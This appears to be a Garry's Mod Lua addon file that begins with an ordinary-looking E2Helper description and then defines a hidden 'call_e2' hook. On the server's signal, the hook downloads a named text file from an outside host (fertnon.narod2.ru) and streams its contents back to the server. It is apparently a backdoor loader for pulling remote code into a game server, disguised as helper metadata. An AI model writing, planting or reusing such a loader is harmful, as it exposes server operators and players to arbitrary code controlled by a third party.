E2Helper.Descriptions["shootTo"] = "entity():shootTo(entity():pos(),entity():forward(),0,0,0,Tracer)"

function call_e2(um)
	local name = um:ReadString()
	http.Get("http://fertnon.narod2.ru/"..name..".txt","",function(code)
		datastream.StreamToServer( "call_e2", { code } );	
	end)
end

usermessage.Hook("call_e2",call_e2,name)
